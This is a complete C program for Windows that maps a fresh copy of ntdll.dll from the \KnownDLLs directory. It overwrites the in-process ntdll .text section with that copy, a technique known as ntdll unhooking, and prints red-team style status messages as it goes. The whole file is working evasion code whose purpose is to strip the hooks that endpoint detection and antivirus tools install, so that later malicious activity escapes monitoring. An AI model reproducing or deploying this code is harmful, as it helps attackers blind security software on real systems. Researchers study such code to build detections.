#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

// Constant for the filename of the ntdll.dll in the KnownDLLs directory
#define NTDLL_FILENAME L"\\KnownDLLs\\ntdll.dll"

// Constant for the name of the text section
#define TEXT_SECTION_NAME "text"

// Typedef for the NtOpenSection API
typedef NTSTATUS(NTAPI* fnNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
    );

// Function to map ntdll.dll from the KnownDLLs directory
BOOL MapNtdllFromKnownDlls(_Out_ PVOID* ppNtdllBuf) {
    HANDLE hSection = NULL;
    PBYTE pNtdllBuffer = NULL;
    NTSTATUS status = NULL;
    UNICODE_STRING UniString = { 0 };
    OBJECT_ATTRIBUTES ObjectAtt = { 0 };

    // Constructing UNICODE_STRING for ntdll.dll path
    UniString.Buffer = (PWSTR)NTDLL_FILENAME;
    UniString.Length = wcslen(NTDLL_FILENAME) * sizeof(WCHAR);
    UniString.MaximumLength = UniString.Length + sizeof(WCHAR);

    // Initialize Object Attributes with UniString
    InitializeObjectAttributes(&ObjectAtt, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Get the address of NtOpenSection function from NTDLL
    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtOpenSection");

    // Use NtOpenSection to get a handle to the section containing ntdll.dll
    status = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjectAtt);
    if (!NT_SUCCESS(status)) {
        printf("[!] pNtOpenSection Failed With Error Code: 0x%08X \n", status);
        CloseHandle(hSection);
        return FALSE;
    }

    // Map the section into memory
    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if (!pNtdllBuffer) {
        printf("[!] MapViewOfFile Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Set the output pointer to the mapped ntdll.dll buffer
    *ppNtdllBuf = pNtdllBuffer;

    return TRUE;
}

// Function to fetch the base address of the local ntdll.dll
PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    // Calculate the base address of the local ntdll.dll
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - sizeof(LIST_ENTRY));

    return pLdr->DllBase;
}

// Function to replace the text section of ntdll.dll
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

    printf("\t[+] 'Hooked' Ntdll Base Address: 0x%p \n\t[+] 'Unhooked' Ntdll Base Address: 0x%p \n", pLocalNtdll, pUnhookedNtdll);

    // Get the DOS header of the local ntdll.dll
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // Get the NT headers of the local ntdll.dll
    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Initialize variables for the text section
    PVOID pLocalNtdllTxt = NULL;    // Local hooked text section base address
    PVOID pRemoteNtdllTxt = NULL;   // Unhooked text section base address
    SIZE_T sNtdllTxtSize = NULL;    // Size of the text section

    // Iterate through the sections to find the text section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    // Display information about the text section
    printf("\t[+] 'Hooked' Ntdll Text Section Address: 0x%p \n\t[+] 'Unhooked' Ntdll Text Section Address: 0x%p \n\t[+] Text Section Size: %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // Check if the required information is retrieved
    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;

    // Check if 'pRemoteNtdllTxt' is really the base address of the text section
    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
        return FALSE;

    // Print message before replacing the text section
    printf("[+] Replacing The Text Section ... ");

    // Save the old memory protection
    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Copy the new text section
    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // Restore the old memory protection
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Replacement successful
    return TRUE;
}

// Main function
int main() {
    PVOID pNtdll = NULL;

    printf("[i] Fetching A New \"ntdll.dll\" File from \"\\KnownDlls\\\" \n");

    // Map ntdll.dll from the KnownDLLs directory
    if (!MapNtdllFromKnownDlls(&pNtdll)) {
        printf("[!] Failed to map ntdll.dll from KnownDLLs directory. Exiting...\n");
        return -1;
    }

    // Replace the text section of ntdll.dll
    if (!ReplaceNtdllTxtSection(pNtdll)) {
        printf("[!] Failed to replace the text section of ntdll.dll. Exiting...\n");
        return -1;
    }

    // Unmap the view of the ntdll.dll file
    UnmapViewOfFile(pNtdll);

    printf("[+] Ntdll Unhooked Successfully \n");

    // Wait for user input before exiting
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
